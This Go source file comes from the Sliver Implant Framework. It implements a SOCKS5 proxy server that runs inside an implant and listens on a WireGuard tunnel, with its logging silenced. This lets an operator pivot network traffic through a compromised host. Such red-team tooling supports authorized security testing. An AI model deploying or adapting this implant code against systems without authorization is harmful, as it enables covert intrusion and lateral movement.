package forwarder

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeWG}}
import (
	"fmt"
	"io"
	"log"
	"net"

	"github.com/bishopfox/sliver/implant/sliver/netstack"
	"github.com/things-go/go-socks5"
)

var socksServerID = 0

// WGSocksServer implements a Socks5 server
type WGSocksServer struct {
	ID       int
	lport    int
	tunIP    string
	tnet     *netstack.Net
	done     chan bool
	listener net.Listener
}

func NewWGSocksServer(lport int, tunIP string, tnet *netstack.Net) *WGSocksServer {
	ss := &WGSocksServer{
		lport: lport,
		tunIP: tunIP,
		tnet:  tnet,
		done:  make(chan bool),
		ID:    socksServerID,
	}
	nextSocksServerID()
	socksServers[ss.ID] = ss
	return ss
}

func (s *WGSocksServer) LocalAddr() string {
	return fmt.Sprintf("%s:%d", s.tunIP, s.lport)
}

func (s *WGSocksServer) Start() error {
	var err error
	server := socks5.NewServer(
		socks5.WithLogger(socks5.NewLogger(log.New(io.Discard, "", log.LstdFlags))),
	)
	select {
	case <-s.done:
		return nil
	default:
		s.listener, err = s.tnet.ListenTCP(&net.TCPAddr{
			IP:   net.ParseIP(s.tunIP),
			Port: s.lport,
		})
		if err != nil {
			return err
		}
		if s.listener == nil {
			return fmt.Errorf("socks listener is nil")
		}
		return server.Serve(s.listener)
	}
}

func (s *WGSocksServer) Stop() {
	close(s.done)
	s.listener.Close()
}

func nextSocksServerID() {
	socksServerID++
}

// {{end}}
